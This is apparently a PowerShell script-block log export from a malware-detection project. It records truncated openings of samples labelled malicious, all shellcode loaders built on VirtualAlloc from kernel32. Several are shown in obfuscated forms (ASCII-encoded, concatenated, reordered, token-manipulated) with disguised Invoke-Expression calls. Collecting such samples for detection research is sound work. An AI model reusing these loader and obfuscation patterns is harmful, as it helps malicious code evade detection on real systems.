"8/6/2026 10:11:14 AM","","2776","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:11:14 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1474.ps1","3601","(((""{63}{50}{83}{19}{42}{8}{16}{39}{22}{4}{58}{57}{44}{1}{60}{20}{72}{12}{35}{32}{33}{41}{23}{46}{34}{78}{66}{2}{18}{67}{17}{28}{51}{73}{11}{40}{49}{45}{36}{52}{47}{68}{74}{84}{81}{54}{29}{77}{69}{27}"
"8/6/2026 10:11:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:11:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:11:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:11:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:11:06 AM","","2776","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:11:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1474.ps1","3187"," . ( $env:cOmSPEC[4,15,25]-jOin'')( ('UShc = xQo[DllImport(FAVkernel32.dllFAV)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, u'+'int flProtect);[DllImp"
"8/6/2026 10:10:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:58 AM","","2776","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1474.ps1","20","{ ( [CHaR][INT] $_)}"
"8/6/2026 10:10:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1474.ps1","12135"," & ( $env:cOMSPEc[4,15,25]-joIn'') ( [stRiNg]::joIn('',( (36, 99 , 32 ,61,32 , 39,91 ,68 , 108, 108 ,73, 109, 112 , 111,114, 116 ,40 ,34, 107, 101 , 114 ,110, 101, 108 ,51, 50 ,46 ,100 , 108, 108, 34 "
"8/6/2026 10:10:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:50 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:50 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:50 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1474.ps1","2776","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:42 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1472.ps1","2451","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:34 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:34 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:34 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:34 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1472.ps1","3198","((""{21}{26}{72}{44}{66}{24}{11}{3}{56}{22}{38}{31}{58}{65}{4}{8}{13}{33}{74}{35}{39}{43}{70}{10}{54}{25}{6}{64}{40}{53}{9}{20}{49}{68}{27}{0}{57}{1}{36}{12}{16}{42}{30}{28}{52}{69}{47}{73}{55}{29}{2}{"
"8/6/2026 10:10:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:26 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:26 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1472.ps1","2771","INVOKe-EXprEsSioN ( ('P5Qc = 7xV[DllImport(2hSkernel32.dll2hS)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProt'+'ect);[DllImport(2hSkernel32."
"8/6/2026 10:10:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:18 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1472.ps1","19","{( [Char][iNt]$_) }"
"8/6/2026 10:10:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1472.ps1","8377",".( $Env:comSPec[4,26,25]-joIN'') ( -JOin('36H99D32Q61A32>39Q91;68A108H108H73Z109Z112A111A114H116<40H34A107<101Q114;110H101w108A51Q50B46A100<108<108A34H41w93D112B117Z98Z108;105w99B32D115A116w97>116w105"
"8/6/2026 10:10:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1472.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:10:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:10:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:10:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:10:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:10:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1468.ps1","2337","$H9S = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:09:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:53 AM","","2331","$H9S = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:09:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1468.ps1","2886"," ((""{3}{36}{26}{39}{10}{34}{0}{12}{2}{14}{23}{44}{20}{37}{5}{45}{29}{43}{11}{4}{42}{25}{21}{32}{7}{15}{40}{38}{6}{24}{31}{48}{22}{30}{13}{9}{28}{18}{35}{17}{19}{27}{41}{16}{8}{46}{33}{47}{1}"" -f', uin"
"8/6/2026 10:09:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:46 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:46 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:46 AM","","2331","$H9S = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:09:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1468.ps1","2696","& ( $veRBoSePrEFeRenCE.TOsTRiNG()[1,3]+'x'-join'')( (('kzQH9S = xDz[DllImport(CUSkernel32.dllCUS)]public static extern IntPtr VirtualAlloc'+'(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint"
"8/6/2026 10:09:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:38 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:38 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:38 AM","","2331","$H9S = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:09:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1468.ps1","24","{ ( [iNT]$_ -AS[ChAr]) }"
"8/6/2026 10:09:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1468.ps1","7953"," .( $VERBOsepReFerEncE.tOsTring()[1,3]+'x'-joIN'') (('36O72O57>83D32I61}32~39y91D68}108}108I73}109}112I111%114~116>40I34%107O101y114_110I101D108_51%50K46K100O108D108}34>41O93_112y117y98I108K105O99y32O"
"8/6/2026 10:09:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1468.ps1","2331","$H9S = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:09:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1463.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:09:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:14 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:14 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:13 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:09:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1463.ps1","2763"," & ( $ShElLId[1]+$sHELLId[13]+'x') ( (((""{8}{41}{15}{4}{22}{24}{34}{26}{6}{45}{27}{21}{0}{17}{16}{31}{18}{30}{44}{3}{35}{40}{1}{11}{9}{19}{36}{20}{46}{23}{39}{38}{28}{25}{10}{43}{2}{32}{37}{29}{14}{7}"
"8/6/2026 10:09:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:09:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:09:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:09:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:09:05 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:09:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1463.ps1","2686"," ('Bi9c = 2ZX[DllImport(L'+'VOkernel32.dllLVO)]public static e'+'xtern IntPtr VirtualAllo'+'c(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll'+'Import(LVOkernel32.dllLVO)]pu"
"8/6/2026 10:08:58 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:58 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:58 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:58 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:57 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1463.ps1","22","{ ( [ChAr] [INT] $_) }"
"8/6/2026 10:08:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1463.ps1","9798"," .( $PSHoMe[4]+$pshOME[34]+'x') ([StrING]::Join( '' ,((36 , 99, 32 ,61 , 32, 39 , 91,68,108, 108 , 73 , 109,112, 111 ,114,116,40,34,107,101 ,114 , 110 ,101 ,108 ,51 ,50, 46,100 ,108 , 108,34 ,41 , 93 "
"8/6/2026 10:08:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:50 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1463.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1461.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:33 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1461.ps1","2769"," ((""{1}{33}{2}{38}{29}{30}{15}{26}{14}{22}{11}{13}{12}{23}{16}{4}{32}{37}{8}{28}{44}{43}{45}{0}{9}{41}{3}{31}{7}{20}{21}{36}{6}{27}{25}{24}{34}{35}{19}{17}{18}{46}{5}{42}{40}{39}{10}""-f',0x8b,0x48,0x1"
"8/6/2026 10:08:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:25 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1461.ps1","2641",".( $PshOmE[21]+$Pshome[34]+'X')((('n62c = wpP[DllImport(RNrkernel32.dllRNr)]public s'+'tati'+'c extern Int'+'Ptr VirtualAlloc(IntPtr'+' lpAddress, u'+'int dwSize, ui'+'nt flAllocation'+'Type, ui'+'nt "
"8/6/2026 10:08:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:17 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1461.ps1","9796","[chAr[]]( 36 , 99,32, 61 ,32,39, 91 ,68,108,108 , 73, 109 ,112,111 , 114,116,40 ,34 ,107, 101 , 114 , 110 ,101 ,108, 51, 50, 46 ,100,108,108, 34, 41 , 93 , 112 , 117 , 98 , 108, 105, 99,32 , 115, 116,"
"8/6/2026 10:08:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1461.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:08:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:08:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:08:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:08:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:08:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1451.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:53 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1451.ps1","2781","&( $ShEllid[1]+$Shellid[13]+'x') ( (((""{6}{23}{18}{8}{17}{34}{13}{41}{38}{36}{26}{32}{30}{42}{31}{33}{44}{24}{29}{46}{11}{5}{37}{10}{39}{0}{9}{35}{15}{7}{12}{20}{4}{16}{2}{21}{19}{14}{45}{27}{25}{43}{"
"8/6/2026 10:07:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:45 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1451.ps1","2542","(('F83c = EZT[DllImport(wc9kernel32.dllwc9)]public static extern IntPtr Virt'+'ualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtec'+'t);[DllImport(wc9kernel32.dllwc9)]publi'+'"
"8/6/2026 10:07:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:37 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1451.ps1","23","{ ( [INt]$_-AS [ChAR])}"
"8/6/2026 10:07:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1451.ps1","9817"," IEx( [StrInG]::jOin('' ,(( 36, 99,32, 61 ,32 , 39 , 91 ,68, 108 ,108 , 73,109 , 112 ,111 ,114,116, 40 , 34,107 , 101 ,114 , 110,101 , 108 ,51,50 ,46 ,100, 108,108,34 ,41,93 , 112, 117 ,98,108 , 105, "
"8/6/2026 10:07:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1451.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1440.ps1","2251","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:07:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:07:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:07:13 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:07:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1440.ps1","2981"," & ( $ENv:coMSpeC[4,24,25]-joIn'')(((""{1}{59}{12}{40}{23}{58}{29}{66}{51}{49}{48}{41}{13}{28}{14}{46}{24}{68}{57}{39}{35}{60}{33}{11}{63}{31}{45}{47}{37}{61}{8}{32}{20}{21}{50}{9}{54}{15}{64}{18}{22}{"
"8/6/2026 10:07:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:07:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
